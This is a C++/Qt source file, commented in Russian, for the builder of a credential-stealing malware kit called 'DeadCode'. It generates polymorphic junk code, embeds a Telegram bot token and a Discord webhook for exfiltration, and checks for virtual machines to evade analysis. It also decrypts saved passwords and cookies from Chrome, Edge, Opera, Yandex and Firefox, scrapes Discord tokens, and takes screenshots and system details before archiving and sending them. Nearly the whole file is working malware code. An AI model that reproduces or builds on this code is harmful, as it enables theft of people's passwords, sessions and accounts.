#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "../src/polymorphic_code.h"
#include "../src/junk_code.h"
#include <QMessageBox>
#include <QProcess>
#include <QFileDialog>
#include <QFile>
#include <QTextStream>
#include <QPropertyAnimation>
#include <QTimer>
#include <QDebug>
#include <QScreen>
#include <QPixmap>
#include <QJsonDocument>
#include <QJsonObject>
#include <QNetworkReply>
#include <QHttpMultiPart>
#include <QHostInfo>
#include <QSettings>
#include <QDir>
#include <QRegularExpression>
#include <random>
#include <sstream>
#include <iomanip>
#include <filesystem>
#include <vector>
#include <string>
#include <fstream>
#include <windows.h>
#include <bcrypt.h>
#include <zip.h>
#include <sqlite3.h>
#include "build_key.h"

// Генерация случайного имени функции для полиморфного кода
std::string generateRandomFuncName() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(97, 122); // a-z
    std::string name = "func_";
    for (int i = 0; i < 8; ++i) {
        name += static_cast<char>(dis(gen));
    }
    return name;
}

// Генерация уникального XOR-ключа
std::string MainWindow::generateUniqueXorKey() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, 255);
    std::stringstream ss;
    ss << std::hex << std::setfill('0');
    for (int i = 0; i < 16; i++) {
        ss << std::setw(2) << dis(gen);
    }
    return ss.str();
}

// Получение ключа шифрования
std::array<unsigned char, 16> MainWindow::GetEncryptionKey(bool useFirstKey) {
    std::array<unsigned char, 16> key;
    std::string keyStr = useFirstKey ? config.encryptionKey1 : config.encryptionKey2;
    if (keyStr.empty()) keyStr = generateUniqueXorKey();
    if (keyStr.length() >= 16) {
        std::memcpy(key.data(), keyStr.c_str(), 16);
    } else {
        std::memset(key.data(), 0, 16);
        std::memcpy(key.data(), keyStr.c_str(), keyStr.length());
    }
    return key;
}

// Проверка на виртуальную машину
bool MainWindow::isRunningInVM() {
    bool isVM = false;

    // Проверка реестра на наличие признаков VM
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\ControlSet001\\Services\\Disk\\Enum", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        wchar_t value[512];
        DWORD size = sizeof(value);
        if (RegQueryValueExW(hKey, L"0", NULL, NULL, (LPBYTE)value, &size) == ERROR_SUCCESS) {
            if (wcsstr(value, L"VMware") || wcsstr(value, L"VirtualBox") || wcsstr(value, L"QEMU")) {
                isVM = true;
            }
        }
        RegCloseKey(hKey);
    }

    // Проверка количества процессоров
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors <= 1) isVM = true;

    // Проверка объема оперативной памяти
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(memInfo);
    GlobalMemoryStatusEx(&memInfo);
    if (memInfo.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) isVM = true;

    // Проверка специфичных процессов VM
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(hProcessSnap, &pe32)) {
            do {
                std::wstring processName = pe32.szExeFile;
                std::transform(processName.begin(), processName.end(), processName.begin(), ::towlower);
                if (processName.find(L"vmtoolsd.exe") != std::wstring::npos ||
                    processName.find(L"vboxservice.exe") != std::wstring::npos) {
                    isVM = true;
                    break;
                }
            } while (Process32NextW(hProcessSnap, &pe32));
        }
        CloseHandle(hProcessSnap);
    }

    return isVM;
}

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
    , manager(new QNetworkAccessManager(this))
    , isBuilding(false)
    , buildTimer(new QTimer(this))
    , statusCheckTimer(new QTimer(this))
{
    ui->setupUi(this);

    // Анимация для логотипа
    QPropertyAnimation *logoAnimation = new QPropertyAnimation(ui->logoLabel, "geometry", this);
    logoAnimation->setDuration(1500);
    logoAnimation->setStartValue(QRect(0, -150, 600, 150));
    logoAnimation->setEndValue(QRect(0, 0, 600, 150));
    logoAnimation->setEasingCurve(QEasingCurve::OutBounce);
    logoAnimation->start();

    // Анимация пульсации для кнопки "Собрать"
    QPropertyAnimation *buttonAnimation = new QPropertyAnimation(ui->buildButton, "size", this);
    buttonAnimation->setDuration(1000);
    buttonAnimation->setStartValue(QSize(100, 40));
    buttonAnimation->setKeyValueAt(0.5, QSize(120, 50));
    buttonAnimation->setEndValue(QSize(100, 40));
    buttonAnimation->setLoopCount(-1);
    buttonAnimation->setEasingCurve(QEasingCurve::InOutQuad);
    buttonAnimation->start();

    // Анимация появления секций
    animateSection(ui->gamingSectionLabel, ui->gamingSpacer);
    animateSection(ui->messengersSectionLabel, ui->messengersSpacer);
    animateSection(ui->browserSectionLabel, ui->browserSpacer);
    animateSection(ui->additionalSectionLabel, ui->additionalSpacer);
    animateSection(ui->stealthSectionLabel, ui->verticalSpacer);

    // Инициализация строки состояния
    ui->statusbar->showMessage("Готово", 0);

    // Подключение сигналов и слотов
    connect(ui->buildButton, &QPushButton::clicked, this, &MainWindow::on_buildButton_clicked);
    connect(ui->iconBrowseButton, &QPushButton::clicked, this, &MainWindow::on_iconBrowseButton_clicked);
    connect(ui->actionSaveConfig, &QAction::triggered, this, &MainWindow::on_actionSaveConfig_triggered);
    connect(ui->actionLoadConfig, &QAction::triggered, this, &MainWindow::on_actionLoadConfig_triggered);
    connect(ui->actionExportLogs, &QAction::triggered, this, &MainWindow::on_actionExportLogs_triggered);
    connect(ui->actionExit, &QAction::triggered, this, &MainWindow::on_actionExit_triggered);
    connect(ui->actionAbout, &QAction::triggered, this, &MainWindow::on_actionAbout_triggered);
    connect(manager, &QNetworkAccessManager::finished, this, &MainWindow::replyFinished);
    connect(ui->sendMethodComboBox, &QComboBox::currentTextChanged, this, [this](const QString& text) {
        ui->statusbar->showMessage("Метод отправки: " + text, 0);
    });
    connect(this, &MainWindow::logUpdated, this, &MainWindow::appendLog);
    connect(this, &MainWindow::startStealSignal, this, &MainWindow::startStealProcess);

    // Подключение таймеров
    connect(buildTimer, &QTimer::timeout, this, &MainWindow::buildExecutable);
    connect(statusCheckTimer, &QTimer::timeout, this, &MainWindow::checkBuildStatus);
}

void MainWindow::animateSection(QLabel* sectionLabel, QSpacerItem* spacer)
{
    QWidget* parentWidget = sectionLabel->parentWidget();
    QVBoxLayout* layout = qobject_cast<QVBoxLayout*>(parentWidget->layout());
    if (!layout) return;

    QList<QWidget*> widgetsToAnimate;
    int startIndex = layout->indexOf(sectionLabel);
    int endIndex = spacer ? layout->indexOf(spacer) : layout->count();

    widgetsToAnimate.append(sectionLabel);
    for (int i = startIndex + 1; i < endIndex; ++i) {
        QLayoutItem* item = layout->itemAt(i);
        if (QWidget* widget = item->widget()) {
            if (dynamic_cast<QCheckBox*>(widget) || dynamic_cast<QComboBox*>(widget)) {
                widgetsToAnimate.append(widget);
            }
        }
    }

    for (QWidget* widget : widgetsToAnimate) {
        widget->setStyleSheet("opacity: 0;");
        widget->setMaximumHeight(0);
    }

    QParallelAnimationGroup* group = new QParallelAnimationGroup(this);
    for (QWidget* widget : widgetsToAnimate) {
        QPropertyAnimation* opacityAnimation = new QPropertyAnimation(widget, "windowOpacity");
        opacityAnimation->setDuration(500);
        opacityAnimation->setStartValue(0);
        opacityAnimation->setEndValue(1);
        opacityAnimation->setEasingCurve(QEasingCurve::OutCubic);

        QPropertyAnimation* heightAnimation = new QPropertyAnimation(widget, "maximumHeight");
        heightAnimation->setDuration(500);
        heightAnimation->setStartValue(0);
        heightAnimation->setEndValue(widget->sizeHint().height());
        heightAnimation->setEasingCurve(QEasingCurve::OutCubic);

        group->addAnimation(opacityAnimation);
        group->addAnimation(heightAnimation);
    }

    QTimer::singleShot(widgetsToAnimate.indexOf(sectionLabel) * 200, this, [group]() {
        group->start(QAbstractAnimation::DeleteWhenStopped);
    });
}

MainWindow::~MainWindow()
{
    delete ui;
    delete manager;
    delete buildTimer;
    delete statusCheckTimer;
}

void MainWindow::generatePolymorphicCode()
{
    std::ofstream polyFile("../src/polymorphic_code.h");
    if (polyFile.is_open()) {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(1, 1000);
        std::string code = "#ifndef POLYMORPHIC_CODE_H\n#define POLYMORPHIC_CODE_H\n\n#include <random>\n\n";
        code += "inline int getRandomNumber(int min, int max) {\n";
        code += "    static std::random_device rd;\n";
        code += "    static std::mt19937 gen(rd());\n";
        code += "    std::uniform_int_distribution<> dis(min, max);\n";
        code += "    return dis(gen);\n}\n\nnamespace Polymorphic {\n";

        int funcCount = dis(gen) % 10 + 5;
        std::vector<std::string> funcNames;
        for (int i = 0; i < funcCount; i++) {
            std::string funcName = generateRandomFuncName();
            funcNames.push_back(funcName);
            code += "inline void " + funcName + "() {\n";
            for (int j = 0; j < dis(gen) % 10 + 5; j++) {
                std::string varName = "dummy_" + std::to_string(dis(gen)) + "_" + std::to_string(rand());
                code += "    volatile int " + varName + " = " + std::to_string(dis(gen) * dis(gen)) + ";\n";
                code += "    " + varName + " += getRandomNumber(1, 100);\n";
                code += "    " + varName + " ^= getRandomNumber(0, 255);\n";
            }
            code += "}\n\n";
        }

        code += "inline void executePolymorphicCode() {\n";
        for (const auto& funcName : funcNames) {
            code += "    " + funcName + "();\n";
        }
        code += "}\n\n} // namespace Polymorphic\n#endif // POLYMORPHIC_CODE_H\n";

        polyFile << code;
        polyFile.close();
        emit logUpdated("Полиморфный код сгенерирован в ../src/polymorphic_code.h\n");
    } else {
        emit logUpdated("Ошибка: Не удалось создать ../src/polymorphic_code.h. Проверьте права доступа.\n");
        isBuilding = false;
    }
}

void MainWindow::generateBuildKeyHeader()
{
    std::string token = ui->tokenLineEdit->text().toStdString();
    std::string chatId = ui->chatIdLineEdit->text().toStdString();
    std::string encryptionKey1 = ui->encryptionKey1LineEdit->text().toStdString();
    std::string encryptionKey2 = ui->encryptionKey2LineEdit->text().toStdString();
    std::string encryptionSalt = ui->encryptionSaltLineEdit->text().toStdString();

    if (encryptionKey1.empty()) encryptionKey1 = generateUniqueXorKey();
    if (encryptionKey2.empty()) encryptionKey2 = generateUniqueXorKey();
    if (encryptionSalt.empty()) encryptionSalt = generateUniqueXorKey();

    std::ofstream buildKeyFile("../src/build_key.h");
    if (buildKeyFile.is_open()) {
        buildKeyFile << "#ifndef BUILD_KEY_H\n#define BUILD_KEY_H\n\n";
        buildKeyFile << "#define TELEGRAM_BOT_TOKEN \"" << token << "\"\n";
        buildKeyFile << "#define TELEGRAM_CHAT_ID \"" << chatId << "\"\n";
        buildKeyFile << "#define DISCORD_WEBHOOK \"" << token << "\"\n";
        buildKeyFile << "#define ENCRYPTION_KEY1 \"" << encryptionKey1 << "\"\n";
        buildKeyFile << "#define ENCRYPTION_KEY2 \"" << encryptionKey2 << "\"\n";
        buildKeyFile << "#define ENCRYPTION_SALT \"" << encryptionSalt << "\"\n";
        buildKeyFile << "#endif // BUILD_KEY_H\n";
        buildKeyFile.close();
        emit logUpdated("../src/build_key.h создан с ключами и данными отправки\n");
    } else {
        emit logUpdated("Ошибка: Не удалось создать ../src/build_key.h. Проверьте права доступа.\n");
        isBuilding = false;
    }
}

void MainWindow::copyIconToBuild()
{
    QString iconPath = ui->iconPathLineEdit->text();
    if (!iconPath.isEmpty()) {
        try {
            std::filesystem::copy_file(iconPath.toStdString(), "../icon.ico", std::filesystem::copy_options::overwrite_existing);
            emit logUpdated("Иконка скопирована в директорию сборки: ../icon.ico\n");
        } catch (const std::exception& e) {
            emit logUpdated("Ошибка копирования иконки: " + QString::fromStdString(e.what()) + "\n");
            isBuilding = false;
        }
    }
}

void MainWindow::buildExecutable()
{
    std::string buildDir = std::string(std::getenv("TEMP")) + "\\DeadCode_Build_" + std::to_string(GetTickCount());
    QDir().mkpath(QString::fromStdString(buildDir));
    emit logUpdated("Создана директория для сборки: " + QString::fromStdString(buildDir) + "\n");

    try {
        std::filesystem::copy("../src", buildDir + "\\src", std::filesystem::copy_options::recursive | std::filesystem::copy_options::overwrite_existing);
        if (!ui->iconPathLineEdit->text().isEmpty()) {
            std::filesystem::copy_file(ui->iconPathLineEdit->text().toStdString(), buildDir + "\\icon.ico", std::filesystem::copy_options::overwrite_existing);
        }
        emit logUpdated("Исходные файлы скопированы в " + QString::fromStdString(buildDir) + "\n");
    } catch (const std::exception& e) {
        emit logUpdated("Ошибка копирования исходных файлов: " + QString::fromStdString(e.what()) + "\n");
        isBuilding = false;
        return;
    }

    std::ofstream proFile(buildDir + "\\stealer.pro");
    if (proFile.is_open()) {
        proFile << "QT += core gui network\n";
        proFile << "greaterThan(QT_MAJOR_VERSION, 4): QT += widgets\n";
        proFile << "TARGET = " << config.filename.substr(0, config.filename.find(".exe")) << "\n";
        proFile << "TEMPLATE = app\n";
        proFile << "SOURCES += src/main.cpp src/polymorphic_code.h src/junk_code.h src/build_key.h\n";
        proFile << "HEADERS += src/polymorphic_code.h src/junk_code.h src/build_key.h\n";
        if (!ui->iconPathLineEdit->text().isEmpty()) {
            proFile << "RC_ICONS = icon.ico\n";
        }
        proFile << "LIBS += -luser32 -lbcrypt -lsqlite3 -lzip\n";
        proFile.close();
        emit logUpdated("Сгенерирован файл проекта: stealer.pro\n");
    } else {
        emit logUpdated("Ошибка: Не удалось создать stealer.pro\n");
        isBuilding = false;
        return;
    }

    QProcess process;
    process.setWorkingDirectory(QString::fromStdString(buildDir));
    process.start("qmake", QStringList() << "stealer.pro");
    if (!process.waitForFinished() || process.exitCode() != 0) {
        emit logUpdated("Ошибка выполнения qmake: " + process.readAllStandardError() + "\n");
        isBuilding = false;
        return;
    }
    emit logUpdated("qmake выполнен успешно\n");

    process.start("mingw32-make");
    if (!process.waitForFinished() || process.exitCode() != 0) {
        emit logUpdated("Ошибка выполнения mingw32-make: " + process.readAllStandardError() + "\n");
        isBuilding = false;
        return;
    }
    emit logUpdated("mingw32-make выполнен успешно\n");

    std::string exePath = buildDir + "\\release\\" + config.filename;
    std::string outputPath = QDir::currentPath().toStdString() + "\\" + config.filename;
    try {
        std::filesystem::copy_file(exePath, outputPath, std::filesystem::copy_options::overwrite_existing);
        emit logUpdated("Готовый билд сохранен: " + QString::fromStdString(outputPath) + "\n");
    } catch (const std::exception& e) {
        emit logUpdated("Ошибка копирования билда: " + QString::fromStdString(e.what()) + "\n");
        isBuilding = false;
        return;
    }

    try {
        std::filesystem::remove_all(buildDir);
        emit logUpdated("Временная директория сборки удалена\n");
    } catch (const std::exception& e) {
        emit logUpdated("Ошибка удаления временной директории: " + QString::fromStdString(e.what()) + "\n");
    }

    isBuilding = false;
    ui->statusbar->showMessage("Сборка завершена", 0);
    emit startStealSignal();
}

void MainWindow::triggerGitHubActions()
{
    QNetworkRequest request(QUrl("https://api.github.com/repos/yourusername/yourrepo/actions/workflows/build.yml/dispatches"));
    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
    request.setRawHeader("Authorization", "token YOUR_GITHUB_TOKEN"); // Замените YOUR_GITHUB_TOKEN на ваш токен
    request.setRawHeader("Accept", "application/vnd.github.v3+json");

    QJsonObject json;
    json["ref"] = "main";
    QByteArray data = QJsonDocument(json).toJson();

    QNetworkReply *reply = manager->post(request, data);
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() == QNetworkReply::NoError) {
            emit logUpdated("Сборка успешно запущена через GitHub Actions\n");
            workflowRunId = QJsonDocument::fromJson(reply->readAll()).object()["id"].toString();
            statusCheckTimer->start(30000);
        } else {
            emit logUpdated("Ошибка запуска GitHub Actions: " + reply->errorString() + "\n");
        }
        reply->deleteLater();
    });
}

void MainWindow::checkBuildStatus()
{
    if (workflowRunId.isEmpty()) return;

    QNetworkRequest request(QUrl("https://api.github.com/repos/yourusername/yourrepo/actions/runs/" + workflowRunId));
    request.setRawHeader("Authorization", "token YOUR_GITHUB_TOKEN"); // Замените YOUR_GITHUB_TOKEN на ваш токен
    request.setRawHeader("Accept", "application/vnd.github.v3+json");

    QNetworkReply *reply = manager->get(request);
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() == QNetworkReply::NoError) {
            QJsonObject json = QJsonDocument::fromJson(reply->readAll()).object();
            QString status = json["status"].toString();
            QString conclusion = json["conclusion"].toString();
            emit logUpdated("Статус сборки GitHub Actions: " + status + " (Conclusion: " + conclusion + ")\n");
            if (status == "completed") {
                statusCheckTimer->stop();
                if (conclusion == "success") {
                    emit logUpdated("Сборка успешно завершена через GitHub Actions\n");
                    emit startStealSignal();
                } else {
                    emit logUpdated("Сборка завершилась с ошибкой\n");
                }
            }
        } else {
            emit logUpdated("Ошибка проверки статуса GitHub Actions: " + reply->errorString() + "\n");
        }
        reply->deleteLater();
    });
}

void MainWindow::startStealProcess()
{
    if (config.antiVM && isRunningInVM()) {
        emit logUpdated("Обнаружена виртуальная машина. Завершение работы.\n");
        FakeError();
        exitApp();
        return;
    }
    if (config.fakeError) FakeError();
    if (config.silent) Stealth();
    if (config.autoStart || config.persist) Persist();
    StealAndSendData();
}

void MainWindow::StealAndSendData()
{
    JunkCode::executeJunkCode();
    emit logUpdated("Выполнен мусорный код перед началом кражи данных\n");

    Polymorphic::executePolymorphicCode();
    emit logUpdated("Выполнен полиморфный код перед началом кражи данных\n");

    std::string tempDir = std::string(std::getenv("TEMP")) + "\\DeadCode_" + std::to_string(GetTickCount());
    QDir().mkpath(QString::fromStdString(tempDir));
    emit logUpdated("Создана временная директория: " + QString::fromStdString(tempDir) + "\n");

    if (config.screenshot) takeScreenshot(tempDir);
    if (config.systemInfo) collectSystemInfo(tempDir);
    if (config.cookies || config.passwords) stealBrowserData(tempDir);
    if (config.discord || config.chatHistory) stealDiscordData(tempDir);
    if (config.telegram || config.chatHistory) stealTelegramData(tempDir);
    if (config.steam || config.steamMAFile) stealSteamData(tempDir);
    if (config.epic) stealEpicData(tempDir);
    if (config.roblox) stealRobloxData(tempDir);
    if (config.battlenet) stealBattleNetData(tempDir);
    if (config.minecraft) stealMinecraftData(tempDir);
    if (config.fileGrabber) stealFiles(tempDir);
    if (config.socialEngineering) collectSocialEngineeringData(tempDir);

    std::string archivePath = tempDir + "\\stolen_data.zip";
    archiveData(tempDir, archivePath);

    std::string encryptedPath = tempDir + "\\stolen_data_encrypted.zip";
    encryptData(archivePath, encryptedPath);

    sendData(encryptedPath);

    try {
        std::filesystem::remove_all(tempDir);
        emit logUpdated("Временная директория удалена: " + QString::fromStdString(tempDir) + "\n");
    } catch (const std::exception& e) {
        emit logUpdated("Ошибка удаления временной директории: " + QString::fromStdString(e.what()) + "\n");
    }
}

void MainWindow::takeScreenshot(const std::string& dir)
{
    QScreen *screen = QGuiApplication::primaryScreen();
    if (screen) {
        QPixmap screenshot = screen->grabWindow(0);
        std::string path = dir + "\\screenshot.png";
        if (screenshot.save(QString::fromStdString(path), "PNG")) {
            emit logUpdated("Скриншот сохранен: " + QString::fromStdString(path) + "\n");
        } else {
            emit logUpdated("Ошибка: Не удалось сохранить скриншот\n");
        }
    } else {
        emit logUpdated("Ошибка: Не удалось сделать скриншот\n");
    }
}

void MainWindow::collectSystemInfo(const std::string& dir)
{
    QString systemInfo = "System Information:\n";
    wchar_t computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
    if (GetComputerNameW(computerName, &size)) {
        systemInfo += "Computer Name: " + QString::fromWCharArray(computerName) + "\n";
    }

    wchar_t userName[UNLEN + 1];
    size = sizeof(userName) / sizeof(userName[0]);
    if (GetUserNameW(userName, &size)) {
        systemInfo += "Username: " + QString::fromWCharArray(userName) + "\n";
    }

    systemInfo += "OS: " + QSysInfo::prettyProductName() + "\n";
    QHostInfo hostInfo = QHostInfo::fromName(QHostInfo::localHostName());
    if (!hostInfo.addresses().isEmpty()) {
        systemInfo += "IP: " + hostInfo.addresses().first().toString() + "\n";
    }

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    systemInfo += "Processor Architecture: " + QString::number(si.wProcessorArchitecture) + "\n";
    systemInfo += "Number of Processors: " + QString::number(si.dwNumberOfProcessors) + "\n";

    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    if (GlobalMemoryStatusEx(&memoryStatus)) {
        systemInfo += "Total Physical Memory: " + QString::number(memoryStatus.ullTotalPhys / (1024 * 1024)) + " MB\n";
    }

    std::string path = dir + "\\system_info.txt";
    QFile file(QString::fromStdString(path));
    if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        QTextStream out(&file);
        out << systemInfo;
        file.close();
        emit logUpdated("Системная информация сохранена: " + QString::fromStdString(path) + "\n");
    } else {
        emit logUpdated("Ошибка: Не удалось сохранить системную информацию\n");
    }
}

void MainWindow::stealBrowserData(const std::string& dir)
{
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);
    std::vector<std::pair<std::string, std::string>> browsers = {
        {"Chrome", std::string(appDataPath) + "\\Google\\Chrome\\User Data\\Default\\"},
        {"Edge", std::string(appDataPath) + "\\Microsoft\\Edge\\User Data\\Default\\"},
        {"Opera", std::string(appDataPath) + "\\Opera Software\\Opera Stable\\"},
        {"OperaGX", std::string(appDataPath) + "\\Opera Software\\Opera GX Stable\\"},
        {"Vivaldi", std::string(appDataPath) + "\\Vivaldi\\User Data\\Default\\"},
        {"Yandex", std::string(appDataPath) + "\\Yandex\\YandexBrowser\\User Data\\Default\\"}
    };

    for (const auto& browser : browsers) {
        if (config.passwords) {
            std::string loginDataPath = browser.second + "Login Data";
            if (std::filesystem::exists(loginDataPath)) {
                std::string tempPath = dir + "\\" + browser.first + "_LoginData_temp";
                std::filesystem::copy_file(loginDataPath, tempPath, std::filesystem::copy_options::overwrite_existing);

                sqlite3 *db;
                if (sqlite3_open(tempPath.c_str(), &db) == SQLITE_OK) {
                    sqlite3_stmt *stmt;
                    if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, nullptr) == SQLITE_OK) {
                        std::string path = dir + "\\" + browser.first + "_passwords.txt";
                        QFile file(QString::fromStdString(path));
                        if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
                            QTextStream out(&file);
                            while (sqlite3_step(stmt) == SQLITE_ROW) {
                                const char* url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                                const char* username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                                auto* password = sqlite3_column_blob(stmt, 2);
                                int passwordLen = sqlite3_column_bytes(stmt, 2);

                                out << "URL: " << (url ? QString::fromUtf8(url) : "N/A") << "\n";
                                out << "Username: " << (username ? QString::fromUtf8(username) : "N/A") << "\n";
                                if (password && passwordLen > 0) {
                                    DATA_BLOB inBlob = {(DWORD)passwordLen, (BYTE*)password};
                                    DATA_BLOB outBlob;
                                    if (CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr, nullptr, 0, &outBlob)) {
                                        out << "Password: " << QString::fromUtf8((char*)outBlob.pbData, outBlob.cbData) << "\n";
                                        LocalFree(outBlob.pbData);
                                    } else {
                                        out << "Password: [Encrypted]\n";
                                    }
                                } else {
                                    out << "Password: N/A\n";
                                }
                                out << "\n";
                            }
                            file.close();
                            emit logUpdated(QString("Пароли %1 сохранены: %2\n").arg(QString::fromStdString(browser.first), QString::fromStdString(path)));
                        }
                        sqlite3_finalize(stmt);
                    }
                    sqlite3_close(db);
                    std::filesystem::remove(tempPath);
                }
            }
        }
        if (config.cookies) {
            std::string cookiesPath = browser.second + "Network\\Cookies";
            if (std::filesystem::exists(cookiesPath)) {
                std::string tempPath = dir + "\\" + browser.first + "_Cookies_temp";
                std::filesystem::copy_file(cookiesPath, tempPath, std::filesystem::copy_options::overwrite_existing);

                sqlite3 *db;
                if (sqlite3_open(tempPath.c_str(), &db) == SQLITE_OK) {
                    sqlite3_stmt *stmt;
                    if (sqlite3_prepare_v2(db, "SELECT host_key, name, encrypted_value FROM cookies", -1, &stmt, nullptr) == SQLITE_OK) {
                        std::string path = dir + "\\" + browser.first + "_cookies.txt";
                        QFile file(QString::fromStdString(path));
                        if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
                            QTextStream out(&file);
                            while (sqlite3_step(stmt) == SQLITE_ROW) {
                                const char* host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                                const char* name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                                auto* value = sqlite3_column_blob(stmt, 2);
                                int valueLen = sqlite3_column_bytes(stmt, 2);

                                out << "Host: " << (host ? QString::fromUtf8(host) : "N/A") << "\n";
                                out << "Name: " << (name ? QString::fromUtf8(name) : "N/A") << "\n";
                                if (value && valueLen > 0) {
                                    DATA_BLOB inBlob = {(DWORD)valueLen, (BYTE*)value};
                                    DATA_BLOB outBlob;
                                    if (CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr, nullptr, 0, &outBlob)) {
                                        out << "Value: " << QString::fromUtf8((char*)outBlob.pbData, outBlob.cbData) << "\n";
                                        LocalFree(outBlob.pbData);
                                    } else {
                                        out << "Value: [Encrypted]\n";
                                    }
                                } else {
                                    out << "Value: N/A\n";
                                }
                                out << "\n";
                            }
                            file.close();
                            emit logUpdated(QString("Куки %1 сохранены: %2\n").arg(QString::fromStdString(browser.first), QString::fromStdString(path)));
                        }
                        sqlite3_finalize(stmt);
                    }
                    sqlite3_close(db);
                    std::filesystem::remove(tempPath);
                }
            }
        }
    }

    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
    std::string firefoxPath = std::string(appDataPath) + "\\Mozilla\\Firefox\\Profiles\\";
    if (std::filesystem::exists(firefoxPath)) {
        for (const auto& entry : std::filesystem::directory_iterator(firefoxPath)) {
            std::string profilePath = entry.path().string();
            if (config.passwords) {
                std::string loginsPath = profilePath + "\\logins.json";
                if (std::filesystem::exists(loginsPath)) {
                    std::string path = dir + "\\firefox_logins.json";
                    if (QFile::copy(QString::fromStdString(loginsPath), QString::fromStdString(path))) {
                        emit logUpdated("Пароли Firefox сохранены: " + QString::fromStdString(path) + "\n");
                    }
                }
            }
            if (config.cookies) {
                std::string cookiesPath = profilePath + "\\cookies.sqlite";
                if (std::filesystem::exists(cookiesPath)) {
                    std::string tempPath = dir + "\\firefox_cookies_temp.sqlite";
                    std::filesystem::copy_file(cookiesPath, tempPath, std::filesystem::copy_options::overwrite_existing);

                    sqlite3 *db;
                    if (sqlite3_open(tempPath.c_str(), &db) == SQLITE_OK) {
                        sqlite3_stmt *stmt;
                        if (sqlite3_prepare_v2(db, "SELECT host, name, value FROM moz_cookies", -1, &stmt, nullptr) == SQLITE_OK) {
                            std::string path = dir + "\\firefox_cookies.txt";
                            QFile file(QString::fromStdString(path));
                            if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
                                QTextStream out(&file);
                                while (sqlite3_step(stmt) == SQLITE_ROW) {
                                    const char* host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                                    const char* name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                                    const char* value = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2));

                                    out << "Host: " << (host ? QString::fromUtf8(host) : "N/A") << "\n";
                                    out << "Name: " << (name ? QString::fromUtf8(name) : "N/A") << "\n";
                                    out << "Value: " << (value ? QString::fromUtf8(value) : "N/A") << "\n\n";
                                }
                                file.close();
                                emit logUpdated("Куки Firefox сохранены: " + QString::fromStdString(path) + "\n");
                            }
                            sqlite3_finalize(stmt);
                        }
                        sqlite3_close(db);
                        std::filesystem::remove(tempPath);
                    }
                }
            }
        }
    }
}

void MainWindow::stealDiscordData(const std::string& dir)
{
    char appDataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataPath);
    std::vector<std::string> discordPaths = {
        std::string(appDataPath) + "\\Discord\\Local Storage\\leveldb\\",
        std::string(appDataPath) + "\\discordcanary\\Local Storage\\leveldb\\",
        std::string(appDataPath) + "\\discordptb\\Local Storage\\leveldb\\"
    };

    std::string path = dir + "\\discord_tokens.txt";
    QFile file(QString::fromStdString(path));
    if (!file.open(QIODevice::WriteOnly | QIODevice::Text)) {
        emit logUpdated("Ошибка: Не удалось создать файл для токенов Discord\n");
        return;
    }
    QTextStream out(&file);
    int tokenCount = 0;

    for (const auto& discordPath : discordPaths) {
        if (std::filesystem::exists(discordPath)) {
            for (const auto& entry : std::filesystem::directory_iterator(discordPath)) {
                if (entry.path().extension() == ".ldb" || entry.path().extension() == ".log") {
                    std::ifstream inFile(entry.path(), std::ios::binary);
                    std::string content((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
                    inFile.close();
                    QRegularExpression re("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_-]{27}");
                    QRegularExpressionMatchIterator i = re.globalMatch(QString::fromStdString(content));
                    while (i.hasNext()) {
                        out << "Token: " << i.next().captured(0) << "\n";
                        tokenCount++;
                    }
                }
            }
        }
    }
    file.close();
    emit logUpdated(QString("Найдено %1 токенов Discord, сохранено в: %2\n").arg(tokenCount).arg(QString::fromStdString(path)));

    if (config.chatHistory) {
        std::string historyPath = dir + "\\discord_history.txt";
        QFile historyFile(QString::fromStdString(historyPath));
        if (historyFile.open(QIODevice::WriteOnly | QIODevice::Text)) {
            QTextStream historyOut(&historyFile);
            historyOut << "Discord Chat History: [Not fully implemented, requires Discord API]\n";
            historyFile.close();
            emit logUpdated("История чатов Discord сохранена (заглушка): " + QString::fromStdString(historyPath) + "\n");
        }
    }
}

